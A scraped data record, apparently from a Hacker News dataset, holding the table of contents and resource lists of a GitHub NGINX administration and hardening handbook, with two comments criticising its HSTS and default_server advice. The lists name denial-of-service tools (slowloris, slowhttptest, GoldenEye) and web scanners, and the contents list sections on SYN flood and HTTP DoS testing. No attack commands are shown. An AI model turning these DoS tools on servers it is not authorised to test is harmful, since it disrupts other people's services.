secure your web applications with NGINX Tuning TCP and NGINX on EC2 Extending functionality in nginx, with modules! Nginx - Tips and Tricks. Nginx Scripting - Extending Nginx Functionalities with Lua How to handle over 1,200,000 HTTPS Reqs/Min Using ngx_lua / lua-nginx-module in pixiv Reading nginx CHANGES together Dynamic modules:how it works NGINX Conf 2014 NGINX Conf 2015 NGINX Conf 2016 NGINX Conf 2017 NGINX Conf 2018 | Deep Dive Track NGINX Conf 2018 | Keynotes and Sessions Making HTTPS Fast(er): Ilya Grigorik @ nginx.conf 2014 Playgrounds NGINX Rate Limit, Burst and nodelay sandbox Config generators nginxconfig - Nginx config generator on steroids. ssl-config-generator - Mozilla SSL Configuration Generator. nginx-config-builder - is a python library for building nginx configuration files programatically. Config parsers crossplane - quick and reliable way to convert NGINX configurations into JSON and back. nginxparser - parses nginx configuration with Pyparsing. Config managers ansible-role-nginx - asible role to install and manage nginx configuration. ansible-role-nginx - installs and configures the latest version of Nginx. ansible-role-nginx - installs NGINX, NGINX Plus, the NGINX Amplify agent, and more. puppet-nginx - puppet module to manage NGINX on various UNIXes. Static analyzers gixy - is a tool to analyze Nginx configuration to prevent security misconfiguration and automate flaw detection. nginx-config-formatter - Nginx config file formatter/beautifier written in Python. nginxbeautifier - format and beautify Nginx config files. nginx-minify-conf - creates a minified version of a Nginx configuration. Log analyzers GoAccess - is a fast, terminal-based log analyzer (quickly analyze and view web server statistics in real time). Graylog - is a leading centralized log management for capturing, storing, and enabling real-time analysis. Logstash - is an open source, server-side data processing pipeline. Performance analyzers ngxtop - parses your Nginx access log and outputs useful, top-like, metrics of your Nginx server. Builder tools Nginx-builder - is a tool for building deb or rpm package NGINX from the source code. Benchmarking tools ab - is a single-threaded command line tool for measuring the performance of HTTP web servers. siege - is an http load testing and benchmarking utility. wrk - is a modern HTTP benchmarking tool capable of generating significant load. wrk2 - is a constant throughput, correct latency recording variant of wrk. vegeta - HTTP load testing tool and library. bombardier - is a HTTP(S) benchmarking tool. gobench - is a HTTP/HTTPS load testing and benchmarking tool. hey - is a HTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom. boom - is a script you can use to quickly smoke-test your web app deployment. httperf - the httperf HTTP load generator. JMeter - is designed to load test functional behavior and measure performance. Gatling - is a powerful open-source load and performance testing tool for web applications. locust - is an easy-to-use, distributed, user load testing tool. slowloris - low bandwidth DoS tool. Slowloris rewrite in Python. slowhttptest - application layer DoS attack simulator. GoldenEye - GoldenEye Layer 7 (KeepAlive+NoCache) DoS test tool. Debugging tools strace - is a diagnostic, debugging and instructional userspace utility (linux syscall tracer) for Linux. GDB - allows you to see what is going on `inside' another program while it executes. SystemTap - provides infrastructure to simplify the gathering of information about the running Linux system. stapxx - simple macro language extensions to SystemTap. htrace.sh - is a simple Swiss Army knife for http/https troubleshooting and profiling. Security & Web testing tools Burp Suite - is a graphical tool for testing Web application security. w3af - is a Web Application Attack and Audit Framework. nikto - web server scanner which performs comprehensive tests. ssllabs-scan - client for SSL Labs APIs, designed for automated and/or bulk testing. http-observatory - Mozilla HTTP Observatory. testssl.sh - checks a server's service on any port for the support of TLS/SSL ciphers. sslyze - is a fast and powerful SSL/TLS server scanning library. cipherscan - is a very simple way to find out which SSL ciphersuites are supported by a target. O-Saft - OWASP SSL advanced forensic tool. Nghttp2 - is an implementation of HTTP/2 and its header compression algorithm HPACK in C. h2spec - is a conformance testing tool for HTTP/2 implementation. h2t - is a simple tool to help sysadmins to hardening their websites. http2fuzz - HTTP/2 fuzzer written in Golang. Arjun - HTTP parameter discovery suite. Corsy - CORS misconfiguration scanner. XSStrike - most advanced XSS scanner. Development Sample ebook generated from NGINX source code. Programming in Lua (first edition) Scripting Nginx with Lua Emillers Guide To Nginx Module Development Emillers Advanced Topics In Nginx Module Development NGINX Tutorial: Developing Modules An Introduction To OpenResty (nginx + lua) - Part 1 An Introduction To OpenResty - Part 2 - Concepts An Introduction To OpenResty - Part 3 OpenResty (Nginx) with dynamically generated certificates Programming OpenResty Online & Web tools SSL Server Test by SSL Labs Test SSL/TLS (PCI DSS, HIPAA and NIST) SSL analyzer and certificate checker Tools for testing SSL configuration Test your TLS server configuration (e.g. ciphers) Scan your website for non-secure content Analyze website security TLS Cipher Suite Search SSL/TLS Capabilities of Your Browser SSL-Client Info's Public Diffie-Hellman Parameter Service/Tool Analyse the HTTP response headers by Security Headers Analyze your website by Mozilla Observatory CAA Record Helper Linting tool that will help you with your site's accessibility, speed, security and more Service to scan and analyse websites Tool from above to either encode or decode a string of text Online translator for search queries on log data Online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript Online tool to learn, build, & test Regular Expressions Online Regex Tester & Debugger Tool for testing regular expressions directly within an NGINX configuration A web app for encryption, encoding, compression and data analysis Nginx location match tester Nginx location match visible Other stuff Web technology for developers Mozilla Web Security Application Security Wiki OWASP ASVS 3.0.1 OWASP ASVS 3.0.1 Web App OWASP ASVS 4.0 OWASP Top 10 Proactive Controls 2018. OWASP Testing Guide v4 OWASP Dev Guide Transport Layer Protection Cheat Sheet by OWASP OWASP WSTG Security/Server Side TLS by Mozilla Applied Crypto Hardening Browser support tables for modern web technologies Memorable site for testing clients against bad SSL configs The HTTPS-Only Standard The Web Security Academy Burp Scanner - Issue Definitions Web application security: what to do when... Transport Layer Security (TLS) Parameters TLS Redirection (and Virtual Host Confusion) TLS Security 6: Examples of TLS Vulnerabilities and Attacks Guidelines for Setting Security Headers Mozilla Guidelines - Web Security Secure your web application with these HTTP headers Security HTTP Headers Analysis of various reverse proxies, cache proxies, load balancers, etc. How HTTPS works ...in a comic! Regular-Expressions Regexp Security Cheatsheet HTTPS on Stack Overflow: The End of a Long Road The Architecture of Open Source Applications - Nginx BBC Digital Media Distribution: How we improved throughput by 4x The C10K problem by Dan Kegel The Secret To 10 Million Concurrent Connections High Performance Browser Networking The System Design Primer awesome-scalability Web Architecture 101 Learn where some of the network sysctl variables fit into the Linux/Kernel network flow jemalloc vs tcmalloc vs dlmalloc On the Impact of Memory Allocation on High-Performance Query Processing GLB: GitHubs open source load balancer What's next? Go back to the Table of Contents or read the next chapters: HTTP Basics Introduction to HTTP. SSL/TLS Basics Introduction to SSL/TLS. NGINX Basics Introduction and explanation of the NGINX mechanisms. Helpers One-liners, commands, utilities for building NGINX, and more. Base Rules (16) The basic set of rules to keep NGINX in a good condition. Debugging (5) A few things for troubleshooting configuration problems. Performance (13) Many methods to make sure the NGINX as fast as possible. Hardening (31) Security and hardening methods in line with best practices. Reverse Proxy (8) A few rules about the NGINX proxy server. Load Balancing (2) Some rules to improve NGINX as a load balancer. Others (4) Other interesting rules, not necessarily linked to NGINX. Configuration Examples Here are some configuration examples. ",
          "Just skimmed through it, and most of this seems to revolve around hardening, not performance, and most of the hardening seems questionable at best. Some of the headers that is suggested have some implications that aren't really explained at all. Like HSTS including sub-domains.<p>And you don't set the `default_server` as this document suggest. `default_server` is a parameter to the `listen`-directive. The only reason the docs might work is because the first server-block defined, when no-one is defined as `default_server`, becomes the default server.<p><pre><code>  server {\n    listen 80 default_server;\n    return 444; \n  }\n</code></pre>\nThis will close the connection and log it internally, for any domain that isn't defined in Nginx.<p>Edit: Shout-out to #nginx on FreeNode, where you'll always find someone to point you i the right directing or help you out.",
          "Don't casually enable HSTS with the following:<p>add_header Strict-Transport-Security \"max-age=63072000; includeSubdomains\" always;<p>On a top domain site like <a href=\"https://example.com\" rel=\"nofollow\">https://example.com</a>, if there are subdomain sites like <a href=\"http://golf.example.com\" rel=\"nofollow\">http://golf.example.com</a> which are not configured with TLS. The setting will be stored on the clients and they need to \"forget\" non-https sites after you have rolled back the misconfiguration. Of course you could go in the other direction and enable https for all subdomains. :)"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/trimstray/nginx-quick-reference",
        "comments.comment_id": [19113203, 19113279],
        "comments.comment_author": ["vegardx", "grafelic"],
        "comments.comment_descendants": [2, 0],
        "comments.comment_time": [
          "2019-02-08T11:18:30Z",
          "2019-02-08T11:33:20Z"
        ],
        "comments.comment_text": [
          "Just skimmed through it, and most of this seems to revolve around hardening, not performance, and most of the hardening seems questionable at best. Some of the headers that is suggested have some implications that aren't really explained at all. Like HSTS including sub-domains.<p>And you don't set the `default_server` as this document suggest. `default_server` is a parameter to the `listen`-directive. The only reason the docs might work is because the first server-block defined, when no-one is defined as `default_server`, becomes the default server.<p><pre><code>  server {\n    listen 80 default_server;\n    return 444; \n  }\n</code></pre>\nThis will close the connection and log it internally, for any domain that isn't defined in Nginx.<p>Edit: Shout-out to #nginx on FreeNode, where you'll always find someone to point you i the right directing or help you out.",
          "Don't casually enable HSTS with the following:<p>add_header Strict-Transport-Security \"max-age=63072000; includeSubdomains\" always;<p>On a top domain site like <a href=\"https://example.com\" rel=\"nofollow\">https://example.com</a>, if there are subdomain sites like <a href=\"http://golf.example.com\" rel=\"nofollow\">http://golf.example.com</a> which are not configured with TLS. The setting will be stored on the clients and they need to \"forget\" non-https sites after you have rolled back the misconfiguration. Of course you could go in the other direction and enable https for all subdomains. :)"
        ],
        "id": "49fc8caa-9cb0-4db4-94ff-c16f8a3f324b",
        "url_text": "Nginx Admin's Handbook My notes on NGINX administration basics, tips & tricks, caveats, and gotchas. Hi-diddle-diddle, he played on his fiddle and danced with lady pigs. Number three said, \"Nicks on tricks! I'll build my house with EN-jin-EKS!\". The Three Little Pigs: Who's Afraid of the Big Bad Wolf? Table of Contents Introduction Prologue Why I created this handbook Who this handbook is for Before you start Contributing & Support RSS Feed & Updates Checklist to rule them all Bonus Stuff Configuration reports SSL Labs Mozilla Observatory Printable hardening cheatsheets Fully automatic installation Static error pages generator Server names parser Books Nginx Essentials Nginx Cookbook Nginx HTTP Server Nginx High Performance Mastering Nginx ModSecurity 3.0 and NGINX: Quick Start Guide Cisco ACE to NGINX: Migration Guide External Resources Nginx official Nginx distributions Comparison reviews Cheatsheets & References Performance & Hardening Presentations & Videos Playgrounds Config generators Config parsers Config managers Static analyzers Log analyzers Performance analyzers Builder tools Benchmarking tools Debugging tools Security & Web testing tools Development Online & Web tools Other stuff What's next? Other chapters HTTP Basics Introduction Features and architecture HTTP/2 How to debug HTTP/2? HTTP/3 URI vs URL Connection vs request HTTP Headers Header compression HTTP Methods Request Request line Methods Request URI HTTP version Request header fields Message body Generate requests Response Status line HTTP version Status codes and reason phrase Response header fields Message body HTTP client IP address shortcuts Back-End web architecture Useful video resources SSL/TLS Basics Introduction TLS versions TLS handshake In which layer is TLS situated within the TCP/IP stack? RSA and ECC keys/certificates Cipher suites Authenticated encryption (AEAD) cipher suites Why cipher suites are important? What does insecure, weak, secure and recommended mean? NGINX and TLS 1.3 Cipher Suites Diffie-Hellman key exchange What exactly is the purpose of these DH Parameters? Certificates Chain of Trust What is the main purpose of the Intermediate CA? Single-domain Multi-domain Wildcard Wildcard SSL doesn't handle root domain? HTTPS with self-signed certificate vs HTTP TLS Server Name Indication Verify your SSL, TLS & Ciphers implementation Useful video resources NGINX Basics Directories and files Commands Processes CPU pinning Shutdown of worker processes Configuration syntax Comments End of lines Variables, Strings, and Quotes Directives, Blocks, and Contexts External files Measurement units Regular expressions with PCRE Enable syntax highlighting Connection processing Event-Driven architecture Multiple processes Simultaneous connections HTTP Keep-Alive connections sendfile, tcp_nodelay, and tcp_nopush Request processing stages Server blocks logic Handle incoming connections Matching location rewrite vs return URL redirections try_files directive if, break, and set root vs alias internal directive External and internal redirects allow and deny uri vs request_uri Compression and decompression What is the best NGINX compression gzip level? Hash tables Server names hash table Log files Conditional logging Manually log rotation Error log severity levels How to log the start time of a request? How to log the HTTP request body? NGINX upstream variables returns 2 values Reverse proxy Passing requests Trailing slashes Passing headers to the backend Importance of the Host header Redirects and X-Forwarded-Proto A warning about the X-Forwarded-For Improve extensibility with Forwarded Response headers Load balancing algorithms Backend parameters Upstream servers with SSL Round Robin Weighted Round Robin Least Connections Weighted Least Connections IP Hash Generic Hash Other methods Rate limiting Variables Directives, keys, and zones Burst and nodelay parameters NAXSI Web Application Firewall OWASP ModSecurity Core Rule Set (CRS) Core modules ngx_http_geo_module 3rd party modules ngx_set_misc ngx_http_geoip_module Helpers Installing from prebuilt packages RHEL7 or CentOS 7 Debian or Ubuntu FreeBSD Installing from source Automatic installation on RHEL/Debian/BSD Nginx package Dependencies Patches 3rd party modules Configure options Compiler and linker Debugging Symbols SystemTap stapxx Installation Nginx on CentOS 7 Pre installation tasks Dependencies Get Nginx sources Download 3rd party modules Build Nginx Post installation tasks Installation OpenResty on CentOS 7 Installation Tengine on Ubuntu 18.04 Installation Nginx on FreeBSD 11.3 Installation Nginx on FreeBSD 11.3 (from ports) Analyse configuration Monitoring GoAccess Build and install Analyse log file and enable all recorded statistics Analyse compressed log file Analyse log file remotely Analyse log file and generate html report Ngxtop Analyse log file Analyse log file and print requests with 4xx and 5xx Analyse log file remotely Testing Build OpenSSL 1.0.2-chacha version Send request and show response headers Send request with http method, user-agent, follow redirects and show response headers Send multiple requests Testing SSL connection Testing SSL connection (debug mode) Testing SSL connection with SNI support Testing SSL connection with specific SSL version Testing SSL connection with specific cipher Testing OCSP Stapling Verify 0-RTT Testing SCSV Load testing with ApacheBench (ab) Standard test Test with Keep-Alive header Load testing with wrk2 Standard scenarios POST call (with Lua) Random paths (with Lua) Multiple paths (with Lua) Random server address to each thread (with Lua) Multiple json requests (with Lua) Debug mode (with Lua) Analyse data pass to and from the threads Parsing wrk result and generate report Load testing with locust Multiple paths Multiple paths with different user sessions TCP SYN flood Denial of Service attack HTTP Denial of Service attack Debugging Show information about processes Check memory usage Show open files Check segmentation fault messages Dump configuration Get the list of configure arguments Check if the module has been compiled Show the most accessed IP addresses Show the most accessed IP addresses (ip and url) Show the most accessed IP addresses (method, code, ip, and url) Show the top 5 visitors (IP addresses) Show the most requested urls Show the most requested urls containing 'string' Show the most requested urls with http methods Show the most accessed response codes Analyse web server log and show only 2xx http codes Analyse web server log and show only 5xx http codes Show requests which result 502 and sort them by number per requests by url Show requests which result 404 for php files and sort them by number per requests by url Calculating amount of http response codes Calculating requests per second Calculating requests per second with IP addresses Calculating requests per second with IP addresses and urls Get entries within last n hours Get entries between two timestamps (range of dates) Get line rates from web server log Trace network traffic for all processes List all files accessed by a NGINX Check that the gzip_static module is working Which worker processing current request Capture only http packets Extract User Agent from the http packets Capture only http GET and POST packets Capture requests and filter by source ip and destination port Capture HTTP requests/responses in real time, filter by GET, HEAD and save to a file Dump a process's memory GNU Debugger (gdb) Dump configuration from a running process Show debug log in memory Core dump backtrace Debugging socket leaks Shell aliases Configuration snippets Nginx server header removal Custom log formats Log only 4xx/5xx Restricting access with basic authentication Restricting access with client certificate Restricting access by geographical location GeoIP 2 database Dynamic error pages with SSI Blocking/allowing IP addresses Blocking referrer spam Limiting referrer spam Blocking User-Agent Limiting User-Agent Limiting the rate of requests with burst mode Limiting the rate of requests with burst mode and nodelay Limiting the rate of requests per IP with geo and map Limiting the number of connections Using trailing slashes Properly redirect all HTTP requests to HTTPS Adding and removing the www prefix Proxy/rewrite and keep the original URL Proxy/rewrite and keep the part of original URL Proxy/rewrite without changing the original URL (in browser) Modify 301/302 response body Redirect POST request with payload to external endpoint Route to different backends based on HTTP method Allow multiple cross-domains using the CORS headers Set correct scheme passed in X-Forwarded-Proto Other snippets Recreate base directory Create a temporary static backend Create a temporary static backend with SSL support Generate password file with htpasswd command Generate private key without passphrase Generate private key with passphrase Remove passphrase from private key Encrypt existing private key with a passphrase Generate CSR Generate CSR (metadata from existing certificate) Generate CSR with -config param Generate private key and CSR List available EC curves Print ECDSA private and public keys Generate ECDSA private key Generate private key and CSR (ECC) Generate self-signed certificate Generate self-signed certificate from existing private key Generate self-signed certificate from existing private key and csr Generate multidomain certificate (Certbot) Generate wildcard certificate (Certbot) Generate certificate with 4096 bit private key (Certbot) Generate DH public parameters Display DH public parameters Extract private key from pfx Extract private key and certs from pfx Extract certs from p7b Convert DER to PEM Convert PEM to DER Verification of the certificate's supported purposes Check private key Verification of the private key Get public key from private key Verification of the public key Verification of the certificate Verification of the CSR Check the private key and the certificate are match Check the private key and the CSR are match TLSv1.3 and CCM ciphers Base Rules (16) Organising Nginx configuration Format, prettify and indent your Nginx code Use reload option to change configurations on the fly Separate listen directives for 80 and 443 ports Define the listen directives with address:port pair Prevent processing requests with undefined server names Never use a hostname in a listen or upstream directives Set the HTTP headers with add_header and proxy_*_header directives properly Use only one SSL config for the listen directive Use geo/map modules instead of allow/deny Map all the things... Set global root directory for unmatched locations Use return directive for URL redirection (301, 302) Configure log rotation policy Use simple custom error pages Don't duplicate index directive, use it only in the http block Debugging (5) Use custom log formats Use debug mode to track down unexpected behaviour Improve debugging by disable daemon, master process, and all workers except one Use core dumps to figure out why NGINX keep crashing Use mirror module to copy requests to another backend Performance (13) Adjust worker processes Use HTTP/2 Maintaining SSL sessions Enable OCSP Stapling Use exact names in a server_name directive if possible Avoid checks server_name with if directive Use $request_uri to avoid using regular expressions Use try_files directive to ensure a file exists Use return directive instead of rewrite for redirects Enable PCRE JIT to speed up processing of regular expressions Activate the cache for connections to upstream servers Make an exact location match to speed up the selection process Use limit_conn to improve limiting the download speed Hardening (31) Always keep NGINX up-to-date Run as an unprivileged user Disable unnecessary modules Protect sensitive resources Take care about your ACL rules Hide Nginx version number Hide Nginx server signature Hide upstream proxy headers Remove support for legacy and risky HTTP request headers Use only the latest supported OpenSSL version Force all connections over TLS Use min. 2048-bit for RSA and 256-bit for ECC Keep only TLS 1.3 and TLS 1.2 Use only strong ciphers Use more secure ECDH Curve Use strong Key Exchange with Perfect Forward Secrecy Prevent Replay Attacks on Zero Round-Trip Time Defend against the BEAST attack Mitigation of CRIME/BREACH attacks Enable HTTP Strict Transport Security Reduce XSS risks (Content-Security-Policy) Control the behaviour of the Referer header (Referrer-Policy) Provide clickjacking protection (X-Frame-Options) Prevent some categories of XSS attacks (X-XSS-Protection) Prevent Sniff Mimetype middleware (X-Content-Type-Options) Deny the use of browser features (Feature-Policy) Reject unsafe HTTP methods Prevent caching of sensitive data Limit concurrent connections Control Buffer Overflow attacks Mitigating Slow HTTP DoS attacks (Closing Slow Connections) Reverse Proxy (8) Use pass directive compatible with backend protocol Be careful with trailing slashes in proxy_pass directive Set and pass Host header only with $host variable Set properly values of the X-Forwarded-For header Don't use X-Forwarded-Proto with $scheme behind reverse proxy Always pass Host, X-Real-IP, and X-Forwarded headers to the backend Use custom headers without X- prefix Always use $request_uri instead of $uri in proxy_pass Load Balancing (2) Tweak passive health checks Don't disable backends by comments, use down parameter Others (4) Set the certificate chain correctly Enable DNS CAA Policy Define security policies with security.txt Use tcpdump to diagnose and troubleshoot the HTTP issues Configuration Examples Reverse Proxy Installation Configuration Import configuration Set bind IP address Set your domain name Regenerate private keys and certs Update modules list Generating the necessary error pages Add new domain Test your configuration Introduction Before you start playing with NGINX please read an official Beginners Guide. It's a great introduction for everyone. Nginx (/ndnks/ EN-jin-EKS, stylized as NGINX or nginx) is an open source HTTP and reverse proxy server, a mail proxy server, and a generic TCP/UDP proxy server with a strong focus on high concurrency, performance and low memory usage. It is originally written by Igor Sysoev. For a long time, it has been running on many heavily loaded Russian sites including Yandex, Mail.Ru, VK, and Rambler. At this moment some high-profile companies using NGINX include Cisco, DuckDuckGo, Facebook, GitLab, Google, Twitter, Apple, Intel, and many more. In the September 2019 it was the most commonly used HTTP server (see Netcraft survey). NGINX is a fast, light-weight and powerful web server that can also be used as a: fast HTTP reverse proxy reliable load balancer high performance caching server full-fledged web platform So, to be brief, it provides the core of complete web stacks and is designed to help build scalable web applications. When it comes to performance, NGINX can easily handle a huge amount of traffic. The other main advantage of the NGINX is that allows you to do the same thing in different ways. Unlike traditional HTTP servers, NGINX doesn't rely on threads to handle requests and it was written with a different architecture in mind - one which is much more suitable for nonlinear scalability in both the number of simultaneous connections and requests per second. NGINX is also known as a Apache Killer (mainly because of its lightness and much less RAM consumption). It is event-based, so it does not follow Apache's style of spawning new processes or threads for each web page request. Generally, it was created to solve the C10K problem. For me, it is a one of the best and most important service that I used in my SysAdmin career. These essential documents should be the main source of knowledge for you: Getting Started NGINX Documentation Development guide Security Controls In addition, I would like to recommend three great docs focuses on the concept of the HTTP protocol: HTTP Made Really Easy Hypertext Transfer Protocol Specification Web technology for developers - HTTP If you love security keep your eye on this one: Cryptology ePrint Archive. It provides access to recent research in cryptology and explores many subjects of security (e.g. Ciphers, Algorithms, SSL/TLS protocols). A great introduction that covers core concepts of cryptography is Practical Cryptography for Developers. I also recommend to read the Bulletproof SSL and TLS. Yep, it's definitely the most comprehensive book about deploying TLS for me. An obligatory source of knowledge is also the OWASP Cheat Sheet Series. You should ought treat it as an excellent security guidance. Burp Scanner - Issue Definitions introduces you to the web apps and security vulnerabilities. Finally, The Web Security Academy is a free online training center for web application security with high-quality reading materials and interactive labs of varying levels of difficulty. All are really good source to start learning about web application security. And, of course, always browse official Nginx Security Advisories and CVE databases like CVE Details or CVE - The MITRE Corporation - to stay Up-to-Date on NGINX vulnerabilities. Prologue When I was studying architecture of HTTP servers I became interested in NGINX. As I was going through research, I kept notes. I found a lot of information about it, e.g. forum posts on the web about every conceivable problem was great. However, I've never found one guide that covers the most important things in a suitable form. I was a little disappointed. I was interested in everything: NGINX internals, functions, security best practices, performance optimisations, tips & tricks, hacks and rules, but for me some of the documents treated the subject lightly. Of course, NGINX Official Documentation is the best place but I know that we also have other great resources: agentzh's Nginx Tutorials Nginx Guts Nginx discovery journey Nginx Secure Web Server Emillers Guide To Nginx Module Development Emillers Advanced Topics In Nginx Module Development These are definitely the best assets for us and in the first place you should seek help there. Moreover, in order to improve your knowledge, please see Books chapter - it contains top literature on NGINX. Why I created this handbook For me, however, there hasn't been a truly in-depth and reasonably simple cheatsheet which describe a variety of configurations and important cross-cutting topics for HTTP servers. Configuration of the NGINX can be tricky sometimes and you really need to get into the syntax and concepts to get an understanding tricks, loopholes, and mechanisms. The documentation isn't as pretty as other projects and should certainly include more robust examples. This handbook is a set of rules and recommendations for the NGINX Open Source HTTP server. It also contains the best practices, notes, and helpers with countless examples. Many of them refer to external resources. There are a lot of things you can do to improve in your NGINX instance and this guide will attempt to cover as many of them as possible. For the most part, it contains the most important things about NGINX for me. I think the configuration you provided should work without any talisman. That's why I created this repository. With this handbook you will explore the many features and capabilities of the NGINX. You'll find out, for example, how to testing the performance or how to resolve debugging problems. You will learn configuration guidelines, security design patterns, ways to handle common issues and how to stay out of them. I explained here a few best tips to avoid pitfalls and configuration mistakes. I added set of guidelines and examples has also been produced to help you administer of the NGINX. They give us insight into NGINX internals also. Mostly, I apply the rules presented here on the NGINX working as a reverse proxy. However, does not to prevent them being implemented for NGINX as a standalone server. Who this handbook is for If you do not have the time to read hundreds of articles (just like me) this multipurpose handbook may be useful. I created it in the hope that it will be useful especially for System Administrators and Experts of Web-based applications. This handbook does not get into all aspects of NGINX. What's more, some of the things described in this guide may be rather basic because most of us do not configure NGINX every day and it is easy to forget about basic/trivial things. On the other hand, also discusses heavyweight topics so there is something for advanced users. I tried to put external resources in many places in this handbook in order to dispel any suspicion that may exist. I did my best to make this handbook a single and consistent (but now I know that is really hard). It's organized in an order that makes logical sense to me. I think it can also be a good complement to official documentation and other great documents. Many of the topics described here can certainly be done better or different. Of course, I still have a lot to improve and to do. I hope you enjoy and have fun with it. Do not treat this handbook and notes written here as revealed knowledge. You should take a scientific approach when reading this document. If you have any doubts and disagree with me, please point out my mistakes. You should to discover cause and effect relationships by asking questions, carefully gathering and examining the evidence, and seeing if all the available information can be combined in to a logical answer. I create this handbook for one more reason. Rather than starting from scratch in, I putting together a plan for answering your questions to help you find the best way to do things and ensure that you don't repeat my mistakes from the past. So, what's most important: ask a questions about something that you observe do background research do tests with an experiments analyze and draw conclusions communicate results (for us!) Finally, you should know I'm not a NGINX expert but I love to know how stuff works and why work the way they do. Im not a crypto expert... but I do know the term \"elliptic curve\" (I really like this quote!). Don't need to be an expert to figure out the reason just got to have used this and not this or why something works this way and not another. It feels good to understand the recommendations and nuances of a topic youre passionate about. Before you start Remember about the following most important things: Blindly deploying of the rules described here can damage your web application! Do not follow guides just to get 100% of something. Think about what you actually do at your server! Copy-and-paste is not the best way to learn. Think twice before adopting rules from this handbook. There are no settings that are perfect for everyone. Always think about what is better and more important for you: security vs usability/compatibility. Security mainly refers to minimise the risk. Change one thing may open a whole new set of problems. Read about how things work and what values are considered secure enough (and for what purposes). The only correct approach is to understand your exposure, measure and tune. + Security is important for ethical reasons. Compliance is important for legal reasons. + The key to workplace contentment is understanding they are unrelated to each other. + Both are important, but one does not lead to the other (compliance != security). author: unknown + Security is always needed, no matter what type of website it is. It can be static HTML + or fully dynamic, an attacker can still inject hostile content into the page in transit + to attack the user. author: Scott Helme + Dont enable older deprecated protocols just because Karen in Florida is still using + a PC that she bought back in 2001. author: thisinterestsmeblog I think, in the age of phishing, cyber attacks, ransomware, etc., you should take care of security of your infrastructure as hard as possible but don't ever forget about this one... Lastly, I would like to quote two very important comments found on the web about compliance with the standards and regulations, and essence of a human factor in security: Regulations that make sense are often not descriptive - capturing the intent and scope of a rule often requires technical expertise. More than that, it's the type of expertise most organisations do not have. And instead of improving themselves, these companies, who may form the grand majority of the industry, petition the regulators to provide a safe checklist of technical mitigations that can be implemented to remain compliant. [...] Instead of doing the right thing and meeting the planned intent, companies are instead ticking nonsensical boxes that the regulators and their auditors demand. Blindly. Mindlessly. Divorced from reality. - by bostik Whenever considering security, the human factor is nearly always as important or more important than just the technical aspects. Policy and procedures need to consider the human element and try to ensure that these policies and procedures are structured in such a way as to help enable staff to do the right thing, even when they may not fully understand why they need to do it. - by Tim X Contributing & Support A real community, however, exists only when its members interact in a meaningful way that deepens their understanding of each other and leads to learning. If you find something which doesn't make sense, or something doesn't seem right, please make a pull request and please add valid and well-reasoned explanations about your changes or comments. Before adding a pull request, please see the contributing guidelines. Code Contributors This project exists thanks to all the people who contribute. ToDo What needs to be done? Look at the following ToDo list: New chapters: Bonus Stuff HTTP Basics SSL/TLS Basics Reverse Proxy Caching Core modules 3rd party modules Web Application Firewall ModSecurity Debugging Existing chapters: Introduction Prologue Why I created this handbook Who this handbook is for Before you start Contributing & Support _RSS Feed & Updates Checklist to rule them all Bonus Stuff Fully automatic installation Static error pages generator Server names parser Books ModSecurity 3.0 and NGINX: Quick Start Guide Cisco ACE to NGINX: Migration Guide External Resources Nginx official Nginx Forum Nginx Mailing List NGINX-Demos Presentations & Videos NGINX: Basics and Best Practices NGINX Installation and Tuning Nginx Internals (by Joshua Zhu) Nginx internals (by Liqiang Xu) How to secure your web applications with NGINX Tuning TCP and NGINX on EC2 Extending functionality in nginx, with modules! Nginx - Tips and Tricks. Nginx Scripting - Extending Nginx Functionalities with Lua How to handle over 1,200,000 HTTPS Reqs/Min Using ngx_lua / lua-nginx-module in pixiv Cheatsheets & References Nginx configurations for most popular CMS/CMF/Frameworks based on PHP Performance & Hardening Memorable site for testing clients against bad SSL configs Config parsers Quick and reliable way to convert NGINX configurations into JSON and back Parses nginx configuration with Pyparsing Config managers Ansible role to install and manage nginx configuration Ansible Role - Nginx Ansible role for NGINX Puppet Module to manage NGINX on various UNIXes Static analyzers nginx-minify-conf Comparison reviews NGINX vs. Apache (Pro/Con Review, Uses, & Hosting for Each) Web cache server performance benchmark: nuster vs nginx vs varnish vs squid Builder tools Nginx-builder Benchmarking tools wrk2 httperf slowloris slowhttptest GoldenEye Debugging tools strace GDB SystemTap stapxx htrace.sh Security & Web testing tools Burp Suite w3af nikto ssllabs-scan http-observatory testssl.sh sslyze cipherscan O-Saft Nghttp2 h2spec http2fuzz Arjun Corsy XSStrike Online & Web tools ssltools Other stuff OWASP Cheat Sheet Series Mozilla Web Security Application Security Wiki OWASP ASVS 4.0 The System Design Primer awesome-scalability Web Architecture 101 HTTP Basics Features and architecture HTTP/2 How to debug HTTP/2? HTTP/3 URI vs URL Connection vs request HTTP Headers Header compression HTTP Methods Request Request line Methods Request URI HTTP version Request header fields Message body Generate requests Response Status line HTTP version Status codes and reason phrase Response header fields Message body HTTP client IP address shortcuts Back-End web architecture Useful video resources SSL/TLS Basics TLS versions TLS handshake In which layer is TLS situated within the TCP/IP stack? RSA and ECC keys/certificates Cipher suites Authenticated encryption (AEAD) cipher suites Why cipher suites are important? NGINX and TLS 1.3 Cipher Suites Diffie-Hellman key exchange Certificates Chain of Trust What is the main purpose of the Intermediate CA? Single-domain Multi-domain Wildcard Wildcard SSL doesn't handle root domain? TLS Server Name Indication Verify your SSL, TLS & Ciphers implementation Useful video resources NGINX Basics Processes CPU pinning Shutdown of worker processes Configuration syntax Comments End of lines Variables, Strings, and Quotes Directives, Blocks, and Contexts External files Measurement units Regular expressions with PCRE Enable syntax highlighting Connection processing Event-Driven architecture Multiple processes Simultaneous connections HTTP Keep-Alive connections sendfile, tcp_nodelay, and tcp_nopush Server blocks logic Matching location if in location Nested locations rewrite vs return try_files directive if, break and set root vs alias internal directive External and internal redirects allow and deny uri vs request_uri Compression and decompression What is the best NGINX compression gzip level? Hash tables Server names hash table Log files Conditional logging Manually log rotation NGINX upstream variables returns 2 values Reverse proxy Passing requests Trailing slashes Processing headers Passing headers Importance of the Host header Redirects and X-Forwarded-Proto A warning about the X-Forwarded-For Improve extensibility with Forwarded Response headers Load balancing algorithms Backend parameters Upstream servers with SSL Round Robin Weighted Round Robin Least Connections Weighted Least Connections IP Hash Generic Hash Fair module Other methods Rate Limiting Variables Directives, keys, and zones Burst and nodelay parameters NAXSI Web Application Firewall OWASP ModSecurity Core Rule Set (CRS) Other subjects Secure Distribution of SSL Private Keys with NGINX Core modules ngx_http_geo_module 3rd party modules ngx_set_misc ngx_http_geoip_module Helpers Installing from source Automatic installation on RHEL/Debian/BSD Compiler and linker Debugging Symbols 